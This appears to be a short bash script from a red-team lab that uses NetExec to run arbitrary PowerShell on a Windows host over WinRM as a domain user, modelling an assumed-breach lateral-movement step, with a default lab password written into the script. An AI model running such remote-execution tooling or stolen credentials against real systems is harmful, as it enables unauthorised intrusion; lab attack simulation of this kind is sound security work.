#!/usr/bin/env bash
# ATTACK lane: operator on provisioning → WinRM to ws01 AS beachhead AD user.
#
# Real assumed-breach path: domain user WinRM session on ws01 (egress 192.168.77.62).
# No vagrant. No Ansible hop. No Invoke-Command credential swap.
#
# Prerequisites (ansible/playbooks/17-ws01-deploy.yml):
#   - analyst_t1 in "Remote Management Users"
#   - WinRM listener :5985
#   - NetExec on provisioning (install-nxc-provisioning.sh)
#
# Config/staging only: ws01-stage-file.sh (vagrant).

set -euo pipefail

WS01_IP="${WS01_IP:-192.168.77.62}"
WS01_AD_USER="${WS01_AD_USER:-analyst_t1}"
WS01_AD_PASS="${WS01_AD_PASS:-T13r_An@lyst!}"
WS01_DOMAIN="${WS01_DOMAIN:-child.cadre.local}"

CMD="${1:?usage: ws01-exec.sh '<powershell command>'}"

export PATH="${HOME}/.local/bin:${PATH}"
if ! command -v nxc >/dev/null 2>&1; then
  echo "nxc not found — run attack-matrix/04-automation/linux/lib/install-nxc-provisioning.sh" >&2
  exit 1
fi

exec nxc winrm "${WS01_IP}" \
  -u "${WS01_AD_USER}" \
  -p "${WS01_AD_PASS}" \
  -d "${WS01_DOMAIN}" \
  -X "${CMD}"
